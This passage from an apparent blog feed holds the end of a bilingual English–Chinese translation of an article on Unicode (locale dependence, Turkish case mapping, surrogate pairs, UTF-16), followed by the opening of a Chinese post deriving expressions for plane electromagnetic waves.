&lt;p&gt;Short answer: it doesn’t. Unfortunately, Unicode is not a perfect system, and it has many shortcomings. Among them is assigning the same code point to glyphs that are supposed to look differently, like Cyrillic Lowercase K and Bulgarian Lowercase K (both are &lt;code&gt;U+043A&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;简短的回答：它不知道。不幸的是，Unicode 不是一个完美的系统，它有很多缺点。其中之一就是是将相同的码位分配给应该看起来不同的字形，比如西里尔小写字母 &amp;lt;span lang=&amp;quot;ru&amp;quot;&amp;gt;K&amp;lt;/span&amp;gt; 和保加利亚语小写字母 &amp;lt;span lang=&amp;quot;bg&amp;quot;&amp;gt;K&amp;lt;/span&amp;gt;（都是 &lt;code&gt;U+043A&lt;/code&gt;）。&lt;/p&gt;
&lt;p&gt;From what I understand, Asian people &lt;a href=&quot;https://en.wikipedia.org/wiki/Han_unification&quot;&gt;get it much worse&lt;/a&gt;: many Chinese, Japanese, and Korean logograms that are written very differently get assigned the same code point:&lt;/p&gt;
&lt;p&gt;据我所知，亚洲人&lt;a href=&quot;https://en.wikipedia.org/wiki/Han_unification&quot;&gt;遭受的打击更大&lt;/a&gt;：许多中文、日文和韩文的象形文字被分配了相同的码位：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload.wikimedia.org/wikipedia/commons/2/23/Source_Han_Sans_Version_Difference.svg&quot; alt=&quot;不同区域设置下的 &quot;&gt;&lt;/p&gt;
&lt;p&gt;Unicode motivation is to save code points space (my guess). Information on how to render is supposed to be transferred outside of the string, as locale/language metadata.&lt;/p&gt;
&lt;p&gt;Unicode 这么做是出于节省码位空间的动机（我猜的）。渲染信息应该在字符串之外传递，作为区域设置（locale）/语言的元数据。&lt;/p&gt;
&lt;p&gt;Unfortunately, it fails the original goal of Unicode:&lt;/p&gt;
&lt;p&gt;不幸的是，它未能实现 Unicode 最初的目标：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[...] no escape sequence or control code is required to specify any character in any language.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;[...] 不需要转义序列或控制码来指定任何语言中的任何字符。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In practice, dependency on locale brings a lot of problems:&lt;/p&gt;
&lt;p&gt;在实际中，对区域设置的依赖带来了很多问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Being metadata, locale often gets lost.&lt;/li&gt;
&lt;li&gt;作为元数据，区域设置经常丢失。&lt;/li&gt;
&lt;li&gt;People are not limited to a single locale. For example, I can read and write English (USA), English (UK), German, and Russian. Which locale should I set my computer to?&lt;/li&gt;
&lt;li&gt;人们不限于单一的区域设置。例如，我可以阅读和写作英语（美国）、英语（英国）、德语和俄语。我应该将我的计算机设置为哪个区域？&lt;/li&gt;
&lt;li&gt;It’s hard to mix and match. Like Russian names in Bulgarian text or vice versa. Why not? It’s the internet, people from all cultures hang out here.&lt;/li&gt;
&lt;li&gt;混起来后再匹配很难。比如保加利亚文中的俄语名字，反之亦然。这种情况不是时有发生吗？这是互联网，来自各种文化的人都在这里冲浪。&lt;/li&gt;
&lt;li&gt;There’s no place to specify the locale. Even making the two screenshots above was non-trivial because in most software, there’s no dropdown or text input to change locale.&lt;/li&gt;
&lt;li&gt;没有地方指定区域设置。即使是制作上面的两个截图也是比较复杂的，因为在大多数软件中，没有下拉菜单或文本输入来更改区域设置。&lt;/li&gt;
&lt;li&gt;When needed, it had to be guessed. For example, Twitter tries to guess the locale from the text of the tweet itself (because where else could it get it from?) and sometimes gets it wrong:&lt;/li&gt;
&lt;li&gt;在需要的时候，我们只能靠猜。例如，Twitter 试图从推文本身的文本中猜测区域设置（因为它还能从哪里得到呢？）时有时会猜错[^twitter]：&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;[^twitter]: Twitter 错误渲染俄语为保加利亚语——注意 &amp;lt;span lang=&apos;bg&apos;&amp;gt;и&amp;lt;/span&amp;gt;、&amp;lt;span lang=&apos;ru&apos;&amp;gt;й&amp;lt;/span&amp;gt;、&amp;lt;span lang=&apos;bg&apos;&amp;gt;ь&amp;lt;/span&amp;gt;、&amp;lt;span lang=&apos;bg&apos;&amp;gt;к&amp;lt;/span&amp;gt;、&amp;lt;span lang=&apos;bg&apos;&amp;gt;з&amp;lt;/span&amp;gt; 等字母的字形。&lt;/p&gt;
&lt;p&gt;&amp;lt;a href=&amp;quot;https://twitter.com/nikitonsky/status/1171115067112398849&amp;quot;&amp;gt;
&amp;lt;Img src=&amp;quot;https://tonsky.me/blog/unicode/twitter_locale.jpg&amp;quot; /&amp;gt;
&amp;lt;/a&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/tonsky/tweet-translated.webp&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;Why does &lt;code&gt;String::toLowerCase()&lt;/code&gt; accepts Locale as an argument?&lt;/h2&gt;
&lt;h2&gt;为什么 &lt;code&gt;String::toLowerCase()&lt;/code&gt; 的参数中有个区域设置？&lt;/h2&gt;
&lt;p&gt;Another unfortunate example of locale dependence is the Unicode handling of dotless &lt;code&gt;i&lt;/code&gt; in the Turkish language.&lt;/p&gt;
&lt;p&gt;Unicode 处理土耳其语中无点 &lt;code&gt;i&lt;/code&gt; 的方式是说明其对区域设置依赖的另一个例子。&lt;/p&gt;
&lt;p&gt;Unlike English, Turks have two &lt;code&gt;I&lt;/code&gt; variants: dotted and dotless. Unicode decided to reuse &lt;code&gt;I&lt;/code&gt; and &lt;code&gt;i&lt;/code&gt; from ASCII and only add two new code points: &lt;code&gt;İ&lt;/code&gt; and &lt;code&gt;ı&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;不同于英国人，土耳其人有两种 &lt;code&gt;I&lt;/code&gt; 变体：有点的和无点的。Unicode 决定重用 ASCII 中的 &lt;code&gt;I&lt;/code&gt; 和 &lt;code&gt;i&lt;/code&gt;，并只添加两个新的码位：&lt;code&gt;İ&lt;/code&gt; 和 &lt;code&gt;ı&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;Unfortunately, that made &lt;code&gt;toLowerCase&lt;/code&gt;/&lt;code&gt;toUpperCase&lt;/code&gt; behave differently on the same input:&lt;/p&gt;
&lt;p&gt;不幸的是，这使得 &lt;code&gt;toLowerCase&lt;/code&gt;/&lt;code&gt;toUpperCase&lt;/code&gt; 在相同的输入上表现不同：&lt;/p&gt;
&lt;p&gt;&amp;lt;Code lang=&apos;js&apos; code={`var en_US = Locale.of(&amp;quot;en&amp;quot;, &amp;quot;US&amp;quot;);
var tr = Locale.of(&amp;quot;tr&amp;quot;);&lt;/p&gt;
&lt;p&gt;&amp;quot;I&amp;quot;.toLowerCase(en_US); // =&amp;gt; &amp;quot;i&amp;quot;
&amp;quot;I&amp;quot;.toLowerCase(tr); // =&amp;gt; &amp;quot;ı&amp;quot;&lt;/p&gt;
&lt;p&gt;&amp;quot;i&amp;quot;.toUpperCase(en_US); // =&amp;gt; &amp;quot;I&amp;quot;
&amp;quot;i&amp;quot;.toUpperCase(tr); // =&amp;gt; &amp;quot;İ&amp;quot;&apos;`} /&amp;gt;&lt;/p&gt;
&lt;p&gt;So no, you can’t convert string to lowercase without knowing what language that string is written in.&lt;/p&gt;
&lt;p&gt;所以，不，你不能在不知道字符串是用什么语言编写的情况下将字符串转换为小写。&lt;/p&gt;
&lt;h2&gt;I live in the US/UK, should I even care?&lt;/h2&gt;
&lt;h2&gt;我住在美国/英国，也应该在意这件事吗？&lt;/h2&gt;
&lt;p&gt;&amp;lt;img
src=&amp;quot;https://tonsky.me/blog/unicode/english@2x.png&amp;quot;
style=&amp;quot;aspect-ratio: 600/67; &amp;quot;
width=&amp;quot;600&amp;quot;
height=&amp;quot;67&amp;quot;
alt={&lt;code&gt;Still — yes. Even pure English text uses lots of “typographical signs” that aren&apos;t available in ASCII, like:&lt;/code&gt;}
/&amp;gt;&lt;/p&gt;
&lt;p&gt;依然应该。即使是纯英文文本也使用了许多 ASCII 中没有的「排版符号」，比如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;quotation marks &lt;code&gt;“&lt;/code&gt; &lt;code&gt;”&lt;/code&gt; &lt;code&gt;‘&lt;/code&gt; &lt;code&gt;’&lt;/code&gt;,&lt;/li&gt;
&lt;li&gt;引号 &lt;code&gt;“&lt;/code&gt; &lt;code&gt;”&lt;/code&gt; &lt;code&gt;‘&lt;/code&gt; &lt;code&gt;’&lt;/code&gt;，&lt;/li&gt;
&lt;li&gt;apostrophe &lt;code&gt;’&lt;/code&gt;,&lt;/li&gt;
&lt;li&gt;撇号 &lt;code&gt;’&lt;/code&gt;，&lt;/li&gt;
&lt;li&gt;dashes &lt;code&gt;–&lt;/code&gt; &lt;code&gt;—&lt;/code&gt;,&lt;/li&gt;
&lt;li&gt;连接号 &lt;code&gt;–&lt;/code&gt; &lt;code&gt;—&lt;/code&gt;，&lt;/li&gt;
&lt;li&gt;different variations of spaces (figure, hair, non-breaking),&lt;/li&gt;
&lt;li&gt;空格的变体（长空格、短空格、不换行空格），&lt;/li&gt;
&lt;li&gt;bullets &lt;code&gt;•&lt;/code&gt; &lt;code&gt;■&lt;/code&gt; &lt;code&gt;☞&lt;/code&gt;,&lt;/li&gt;
&lt;li&gt;点 &lt;code&gt;•&lt;/code&gt; &lt;code&gt;■&lt;/code&gt; &lt;code&gt;☞&lt;/code&gt;，&lt;/li&gt;
&lt;li&gt;currency symbols other than the &lt;code&gt;$&lt;/code&gt; (kind of tells you who invented computers, doesn’t it?): &lt;code&gt;€&lt;/code&gt; &lt;code&gt;¢&lt;/code&gt; &lt;code&gt;£&lt;/code&gt;,&lt;/li&gt;
&lt;li&gt;除了 &lt;code&gt;$&lt;/code&gt; 之外的货币符号（这有点告诉你是谁发明了计算机，不是吗？）：&lt;code&gt;€&lt;/code&gt; &lt;code&gt;¢&lt;/code&gt; &lt;code&gt;£&lt;/code&gt;，&lt;/li&gt;
&lt;li&gt;mathematical signs—plus &lt;code&gt;+&lt;/code&gt; and equals &lt;code&gt;=&lt;/code&gt; are part of ASCII, but minus &lt;code&gt;−&lt;/code&gt; and multiply &lt;code&gt;×&lt;/code&gt; are not &amp;lt;nobr&amp;gt;¯_(ツ)_/¯&amp;lt;/nobr&amp;gt;,&lt;/li&gt;
&lt;li&gt;数学符号——加号 &lt;code&gt;+&lt;/code&gt; 和等号 &lt;code&gt;=&lt;/code&gt; 是 ASCII 的一部分，但减号 &lt;code&gt;−&lt;/code&gt; 和乘号 &lt;code&gt;×&lt;/code&gt; 不是 &amp;lt;nobr&amp;gt;¯_(ツ)_/¯&amp;lt;/nobr&amp;gt;，&lt;/li&gt;
&lt;li&gt;various other signs &lt;code&gt;©&lt;/code&gt; &lt;code&gt;™&lt;/code&gt; &lt;code&gt;¶&lt;/code&gt; &lt;code&gt;†&lt;/code&gt; &lt;code&gt;§&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;各种其他符号 &lt;code&gt;©&lt;/code&gt; &lt;code&gt;™&lt;/code&gt; &lt;code&gt;¶&lt;/code&gt; &lt;code&gt;†&lt;/code&gt; &lt;code&gt;§&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Hell, you can’t even spell &lt;code&gt;café&lt;/code&gt;, &lt;code&gt;piñata&lt;/code&gt;, or &lt;code&gt;naïve&lt;/code&gt; without Unicode. So yes, we are all in it together, even Americans.&lt;/p&gt;
&lt;p&gt;见鬼，不用 Unicode，你甚至拼写不了 &lt;code&gt;café&lt;/code&gt;、&lt;code&gt;piñata&lt;/code&gt;
或 &lt;code&gt;naïve&lt;/code&gt;。所以是的，我们同舟共济，即使是美国人。&lt;/p&gt;
&lt;p&gt;Touché.&lt;/p&gt;
&lt;p&gt;法国人：你书的队。[^touche]
[^touche]: 原文是法语 &amp;lt;span lang=&amp;quot;fr&amp;quot;&amp;gt;&amp;lt;q&amp;gt;Touché&amp;lt;/q&amp;gt;&amp;lt;/span&amp;gt;，意为「说得好」、「一针见血」。&lt;/p&gt;
&lt;h2&gt;What are surrogate pairs?&lt;/h2&gt;
&lt;h2&gt;什么是代理对？&lt;/h2&gt;
&lt;p&gt;That goes back to Unicode v1. The first version of Unicode was supposed to be fixed-width. A 16-bit fixed width, to be exact:&lt;/p&gt;
&lt;p&gt;这要追溯到 Unicode v1。Unicode 的第一个版本应该是固定宽度的。准确地说，是 16 位固定宽度：&lt;/p&gt;
&lt;p&gt;&amp;lt;Img
src=&amp;quot;https://tonsky.me/blog/unicode/unicode1@2x.png&amp;quot;
zhcap=&amp;quot;Unicode 标准的 1.0 版本, 1991 年 10 月&amp;quot;
encap=&amp;quot;Version 1.0 of the Unicode Standard, October 1991&amp;quot;
width=&amp;quot;840&amp;quot;
height=&amp;quot;558&amp;quot;
/&amp;gt;&lt;/p&gt;
&lt;p&gt;They believed 65,536 characters would be enough for all human languages. They were almost right!&lt;/p&gt;
&lt;p&gt;他们相信 65,536 个字符足以涵盖所有人类语言。他们几乎是对的！&lt;/p&gt;
&lt;p&gt;When they realized they needed more code points, UCS-2 (an original version of UTF-16 without surrogates) was already used in many systems. 16 bit, fixed-width, it only gives you 65,536 characters. What can you do?&lt;/p&gt;
&lt;p&gt;当他们意识到他们需要更多的码位时，UCS-2（没有代理对的 UTF-16 的原始版本）已经在许多系统中使用了。16 位，固定宽度，只给你 65,536 个字符。你能做什么呢？&lt;/p&gt;
&lt;p&gt;Unicode decided to allocate some of these 65,536 characters to encode higher code points, essentially converting fixed-width UCS-2 into variable-width UTF-16.&lt;/p&gt;
&lt;p&gt;Unicode 决定将这 65,536 个字符中的一些分配给编码更高码位的字符，从而将固定宽度的 UCS-2 转换为可变宽度的 UTF-16。&lt;/p&gt;
&lt;p&gt;A surrogate pair is two UTF-16 units used to encode a single Unicode code point. For example, &lt;code&gt;D83D DCA9&lt;/code&gt; (two 16-bit units) encodes &lt;em&gt;one&lt;/em&gt; code point, &lt;code&gt;U+1F4A9&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&amp;lt;dfn&amp;gt;代理对&amp;lt;/dfn&amp;gt;（&amp;lt;span&amp;gt;surrogate pair&amp;lt;/span&amp;gt;）是用于编码单个 Unicode 码位的两个 UTF-16 单位。例如，&lt;code&gt;D83D DCA9&lt;/code&gt;（两个 16 位单位）编码了一个码位，&lt;code&gt;U+1F4A9&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;The top 6 bits in surrogate pairs are used for the mask, leaving 2×10 free bits to spare:&lt;/p&gt;
&lt;p&gt;代理对中的前 6 位用于掩码，剩下 2×10 个空闲位：&lt;/p&gt;
&lt;p&gt;&amp;lt;pre&amp;gt;
High Surrogate          Low Surrogate
D800        ++          DC00
1101 10?? ???? ???? ++ 1101 11?? ???? ????
&amp;lt;/pre&amp;gt;&lt;/p&gt;
&lt;p&gt;Technically, both halves of the surrogate pair can be seen as Unicode code points, too. In practice, the whole range from &lt;code&gt;U+D800&lt;/code&gt; to &lt;code&gt;U+DFFF&lt;/code&gt; is allocated as “for surrogate pairs only”. Code points from there are not even considered valid in any other encodings.&lt;/p&gt;
&lt;p&gt;从技术上讲，代理对的两半也可以看作是 Unicode 码位。实际上，从 &lt;code&gt;U+D800&lt;/code&gt; 到 &lt;code&gt;U+DFFF&lt;/code&gt; 的整个范围都被分配为「仅用于代理对」。从那里开始的码位甚至在任何其他编码中都不被认为是有效的。&lt;/p&gt;
&lt;p&gt;&amp;lt;Plane
zhcap=&amp;quot;这个在已经非常拥挤的基本多语言平面上的空间永远不会再被拿来干任何好事&amp;quot;
encap=&amp;quot;This space on a very crammed Basic Multilingual Plane will never be used for anything good ever again
&amp;quot;&amp;gt;
&amp;lt;g class=&amp;quot;glow&amp;quot; transform=&amp;quot;scale(0.6) translate(391,645)&amp;quot; data-href=&amp;quot;https://tonsky.me/blog/unicode/bmp@2x.png&amp;quot;&amp;gt;
&amp;lt;path d=&amp;quot;M438.5 17C349.72 12.1302 215.423 7.75743 148.212 5.8528C139.796 5.61431 131.411 6.84615 123.414 9.4789L37.054 37.9102C22.9757 42.545 12.8279 54.8766 10.9895 69.5838L10.1055 76.6557C9.09987 84.701 12.101 92.7284 18.1379 98.1409V98.1409C21.3247 100.998 25.1984 102.979 29.3802 103.891L81.8143 115.324C86.9233 116.438 92.106 117 97.335 117C149.492 117 241.199 117 245 117C248.575 117 322.194 105.015 370.158 97.115C380.609 95.3934 390.536 91.4131 399.293 85.4535L448.493 51.9702C454.44 47.9225 458 41.1943 458 34V34&amp;quot; stroke=&amp;quot;#FF00C9&amp;quot; stroke-width=&amp;quot;11&amp;quot; stroke-linecap=&amp;quot;round&amp;quot; fill=&amp;quot;transparent&amp;quot; fill-opacity=&amp;quot;0&amp;quot; /&amp;gt;
&amp;lt;/g&amp;gt;
&amp;lt;style&amp;gt; {&lt;code&gt;.glow:hover { filter: drop-shadow(0 0 6px #FF00C9); opacity: 90%; transition: all 0.2s; }&lt;/code&gt;} &amp;lt;/style&amp;gt;
&amp;lt;/Plane&amp;gt;&lt;/p&gt;
&lt;h2&gt;Is UTF-16 still alive?&lt;/h2&gt;
&lt;h2&gt;UTF-16 还活着吗？&lt;/h2&gt;
&lt;p&gt;Yes!&lt;/p&gt;
&lt;p&gt;是的！&lt;/p&gt;
&lt;p&gt;The promise of a fixed-width encoding that covers all human languages was so compelling that many systems were eager to adopt it. Among them were Microsoft Windows, Objective-C, Java, JavaScript, .NET, Python 2, QT, SMS, and CD-ROM!&lt;/p&gt;
&lt;p&gt;一个定长的、涵盖所有人类语言的编码的许诺是如此令人信服，以至于许多系统都迫不及待地采用了它。例如，Microsoft Windows、Objective-C、Java、JavaScript、.NET、Python 2、QT、短信，还有 CD-ROM！&lt;/p&gt;
&lt;p&gt;Since then, Python has moved on, CD-ROM has become obsolete, but the rest is stuck with UTF-16 or even UCS-2. So UTF-16 lives there as in-memory representation.&lt;/p&gt;
&lt;p&gt;自从那时以来，Python 已经进步了，CD-ROM 已经过时了，但其余的仍然停留在 UTF-16 甚至 UCS-2。因此，UTF-16 作为内存表示而存在。&lt;/p&gt;
&lt;p&gt;In practical terms today, UTF-16 has roughly the same usability as UTF-8. It’s also variable-length; counting UTF-16 units is as useless as counting bytes or code points, grapheme clusters are still a pain, etc. The only difference is memory requirements.&lt;/p&gt;
&lt;p&gt;在今天的实际情况下，UTF-16 的可用性与 UTF-8 大致相同。它也是变长的；计算 UTF-16 单元与计算字节或码位一样没有用，字位簇仍然很痛苦，等等。唯一的区别是内存需求。&lt;/p&gt;
&lt;p&gt;The only downside of UTF-16 is that everything else is UTF-8, so it requires conversion every time a string is read from the network or from disk.&lt;/p&gt;
&lt;p&gt;UTF-16 的唯一缺点是其他所有东西都是 UTF-8，因此每次从网络或磁盘读取字符串时都要转换一下。&lt;/p&gt;
&lt;p&gt;Also, fun fact: the number of planes Unicode has (17) is defined by how much you can express with surrogate pairs in UTF-16.&lt;/p&gt;
&lt;p&gt;还有一个有趣的事实：Unicode 的平面数（17）是由 UTF-16 中代理对可以表达的内容决定的。&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;h2&gt;结论&lt;/h2&gt;
&lt;p&gt;To sum it up:&lt;/p&gt;
&lt;p&gt;让我们总结一下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Unicode has won.&lt;/li&gt;
&lt;li&gt;Unicode 已经赢了。&lt;/li&gt;
&lt;li&gt;UTF-8 is the most popular encoding for data in transfer and at rest.&lt;/li&gt;
&lt;li&gt;UTF-8 是传输和储存数据时使用最广泛的编码。&lt;/li&gt;
&lt;li&gt;UTF-16 is still sometimes used as an in-memory representation.&lt;/li&gt;
&lt;li&gt;UTF-16 仍然有时被用作内存表示。&lt;/li&gt;
&lt;li&gt;The two most important views for strings are bytes (allocate memory/copy/encode/decode) and extended grapheme clusters (all semantic operations).&lt;/li&gt;
&lt;li&gt;字符串的两个最重要的视图是字节（分配内存/复制/编码/解码）和扩展字位簇（所有语义操作）。&lt;/li&gt;
&lt;li&gt;Using code points for iterating over a string is wrong. They are not the basic unit of writing. One grapheme could consist of multiple code points.&lt;/li&gt;
&lt;li&gt;以码位为单位来迭代字符串是错误的。它们不是书写的基本单位。一个字位可能由多个码位组成。&lt;/li&gt;
&lt;li&gt;To detect grapheme boundaries, you need Unicode tables.&lt;/li&gt;
&lt;li&gt;要检测字位的边界，你需要表格。&lt;/li&gt;
&lt;li&gt;Use a Unicode library for everything Unicode, even boring stuff like &lt;code&gt;strlen&lt;/code&gt;, &lt;code&gt;indexOf&lt;/code&gt; and &lt;code&gt;substring&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;对于所有 Unicode 相关的东西，甚至是像 &lt;code&gt;strlen&lt;/code&gt;、&lt;code&gt;indexOf&lt;/code&gt; 和 &lt;code&gt;substring&lt;/code&gt; 这样的无聊的东西，都要使用 Unicode 库。&lt;/li&gt;
&lt;li&gt;Unicode updates every year, and rules sometimes change.&lt;/li&gt;
&lt;li&gt;Unicode 每年更新一次，规则有时会改变。&lt;/li&gt;
&lt;li&gt;Unicode strings need to be normalized before they can be compared.&lt;/li&gt;
&lt;li&gt;Unicode 字符串在比较之前需要进行归一化。&lt;/li&gt;
&lt;li&gt;Unicode depends on locale for some operations and for rendering.&lt;/li&gt;
&lt;li&gt;Unicode 在某些操作和渲染中依赖于区域设置。&lt;/li&gt;
&lt;li&gt;All this is important even for pure English text.&lt;/li&gt;
&lt;li&gt;即使是纯英文文本，这些都很重要。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Overall, yes, Unicode is not perfect, but the fact that&lt;/p&gt;
&lt;p&gt;总的来说，是的，Unicode 不完美，但&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;an encoding exists that covers all possible languages at once,&lt;/li&gt;
&lt;li&gt;有一个能覆盖所有可能语言的编码、&lt;/li&gt;
&lt;li&gt;the entire world agrees to use it,&lt;/li&gt;
&lt;li&gt;全世界都同意使用它、&lt;/li&gt;
&lt;li&gt;we can completely forget about encodings and conversions and all that stuff&lt;/li&gt;
&lt;li&gt;我们可以完全忘记编码和转换之类的东西&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;is a miracle. Send this to your fellow programmers so they can learn about it, too.&lt;/p&gt;
&lt;p&gt;的事实是一个奇迹。把这篇文章发送给你的程序员群友们，让他们也能了解它。&lt;/p&gt;
&lt;p&gt;&amp;lt;Loud en=&amp;quot;There’s such a thing as plain text, and it’s encoded with UTF-8.&amp;quot;&amp;gt;的确有这样一种东西叫做纯文本，&amp;lt;br /&amp;gt;并且它使用 UTF-8 进行编码。&amp;lt;/Loud&amp;gt;&lt;/p&gt;
&lt;p&gt;Thanks Lev Walkin and my patrons for reading early drafts of this article.&lt;/p&gt;
&lt;p&gt;感谢 Lev Walkin 和我的赞助者们阅读了本文的早期草稿。&lt;/p&gt;
&lt;p&gt;&amp;lt;div class=&amp;quot;footer&amp;quot;&amp;gt;
2023 年 10 月 2 日
· 在 &lt;a href=&quot;https://news.ycombinator.com/item?id=37735801&quot;&gt;HackerNews&lt;/a&gt; 上讨论
· 翻译于 &amp;lt;time itemprop=&amp;quot;pubDate&amp;quot; datetime={frontmatter.date}&amp;gt;2023 年 10 月 27 日&amp;lt;/time&amp;gt;
· 在 &lt;a href=&quot;https://twitter.com/lazy_static/status/1718672213585301620&quot;&gt;Twitter&lt;/a&gt; 上讨论（中文）·
最后更新于 &amp;lt;time&amp;gt;11 月 24 日&amp;lt;/time&amp;gt;
&amp;lt;/div&amp;gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;br /&amp;gt;
&amp;lt;br /&amp;gt;&lt;/p&gt;
&lt;h3&gt;Translator&apos;s note&lt;/h3&gt;
&lt;h3&gt;译者注&lt;/h3&gt;
</content:encoded></item><item><title>平面电磁波的表达式</title><link>https://blog.xinshijiededa.men/plane-electromagnetic-waves/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/plane-electromagnetic-waves/</guid><description>平面电磁波可能是三维的波的最简单的例子。</description><pubDate>Tue, 26 Sep 2023 22:32:32 GMT</pubDate><content:encoded>&lt;p&gt;平面电磁波是指在与传播方向正交的平面上各点电场或磁场具有相同值的电磁波．平面电磁波可能是三维的波的最简单的例子．根据傅里叶变换，任何一个波都可以看作是一系列平面波的叠加．因此，平面电磁波是一种非常重要的波．&lt;/p&gt;
&lt;p&gt;平面电磁波可以由其电场 $\boldsymbol E$ 或磁场 $\boldsymbol B$ 的表达式来描述．但是，由于人眼和仪器更容易观测到电场，因此我们通常使用电场的表达式来描述平面电磁波．为了便于计算，其表达式有多种形式．&lt;/p&gt;
&lt;h2&gt;体现平面简谐波周期性的量&lt;/h2&gt;
&lt;p&gt;在分析其表达式之前，我们需要先定义一些量．&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;lt;dfn&amp;gt;振幅&amp;lt;/dfn&amp;gt; $A$&lt;/li&gt;
&lt;li&gt;&amp;lt;dfn&amp;gt;初相位&amp;lt;/dfn&amp;gt; $\varphi_0$&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这两个量在接下来的变换中都很简单．接下来：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;空间&lt;/th&gt;
&lt;th&gt;时间&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;空间周期 aka 波长 $\lambda$&lt;/td&gt;
&lt;td&gt;时间周期 aka 周期 $T$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;空间频率 aka &amp;lt;span class=&amp;quot;wn&amp;quot;&amp;gt;波数&amp;lt;/span&amp;gt; $\tilde\nu = \dfrac{1}{\lambda}$&lt;/td&gt;
&lt;td&gt;时间频率 aka 频率 aka &amp;lt;ruby lang=&amp;quot;ja&amp;quot;&amp;gt;周&amp;lt;span class=&amp;quot;wn&amp;quot;&amp;gt;波数&amp;lt;/span&amp;gt;&amp;lt;rt&amp;gt;しゅう&amp;lt;span class=&amp;quot;wn&amp;quot;&amp;gt;はすう&amp;lt;/span&amp;gt;&amp;lt;/rt&amp;gt;&amp;lt;/ruby&amp;gt; $\nu=\dfrac{1}{T}$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;空间角频率 aka 波矢的绝对值 &amp;lt;br /&amp;gt; $\color{#b42242}k = \dfrac{2\pi}{\lambda}$&lt;/td&gt;
&lt;td&gt;时间角频率 aka 角频率&amp;lt;br /&amp;gt; $\color{#126a1e}\omega = 2\pi\nu = \dfrac{2\pi}{T}$&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&amp;lt;style&amp;gt; .wn { color: #cc4211; } &amp;lt;/style&amp;gt;&lt;/p&gt;
&lt;p&gt;空间与时间量的关系很好理解．比如，&lt;strong&gt;空间周期与时间周期之比就是波速 ${\color{#aa34ae}v = \dfrac{\lambda}{T}} = \lambda\nu = \dfrac \omega k$．&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;❗ 这个关系很重要．如果你在做题时发现缺少时间或空间的条件，那么不要忘了波速，因为波速通常不会在题目中显式地给出．所以我们要注意题目是否给出了介质折射率，或者所求光线是在真空中传播（光速）．&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;电场的表达式&lt;/h2&gt;
&lt;h3&gt;沿坐标轴传播&lt;/h3&gt;
&lt;p&gt;那么，沿 $z$ 轴传播的平面简谐电磁波的电场表达式如下：&lt;/p&gt;
&lt;p&gt;$$
\begin{align}
\boldsymbol{E} &amp;amp;= \boldsymbol{A}\cdot \cos \left(2\pi \left( \dfrac{z}{\lambda}-\dfrac{t}{T}\right) +\varphi_0\right) \
\boldsymbol{E} &amp;amp;= \boldsymbol{A}\cdot \cos \left(kz-\omega t +\varphi_0\right) \
\boldsymbol{E} &amp;amp;= \boldsymbol{A}\cdot \cos \left(\omega \left(\dfrac zv-t\right) +\varphi_0\right)
\end{align}
$$&lt;/p&gt;
&lt;p&gt;记住式 $(1)$，其余的两个式子很好推导：&lt;/p&gt;
&lt;p&gt;$$
\begin{align*}
\boldsymbol{E} &amp;amp;= \boldsymbol{A}\cdot \cos \left(2\pi \left( \dfrac{z}{\lambda}-\dfrac{t}{T}\right) {\color{#666}+\varphi_0}\right) \
&amp;amp;= \boldsymbol{A}\cdot \cos \left({\color{#b42242}\dfrac{2\pi}{\lambda}}-\color{#126a1e}\dfrac{2\pi}{T}\color{black}t {\color{#666}+\varphi_0}\right) \
&amp;amp;= \boldsymbol{A}\cdot \cos \left(\color{#b42242}k\color{black}z-{\color{#126a1e}\omega} t {\color{#666}+\varphi_0}\right).
\end{align*}
$$&lt;/p&gt;
&lt;p&gt;$$
\begin{align*}
\boldsymbol{E} &amp;amp;=\boldsymbol{A}\cdot \cos \left(2\pi \left( \dfrac{z}{\lambda}-{\color{#1472c9}\dfrac{\color{black}t}{T}}\right) {\color{#666}+\varphi_0}\right) \
&amp;amp;= \boldsymbol{A}\cdot \cos \left({\color{#126a1e}\dfrac{2\pi}{\color{#1472c9}T}} \left({\color{#aa34ae}\dfrac{\color{#1472c9}T}{\lambda}}z - t\right) {\color{#666}+\varphi_0}\right) \
&amp;amp;= \boldsymbol{A}\cdot \cos \left(\color{#126a1e}\omega\color{black} \left({\color{#aa34ae}\dfrac {\color{black}z}v}-t\right) {\color{#666}{\color{#666}+\varphi_0}}\right).
\end{align*}
$$&lt;/p&gt;
&lt;h3&gt;沿任意方向传播&lt;/h3&gt;
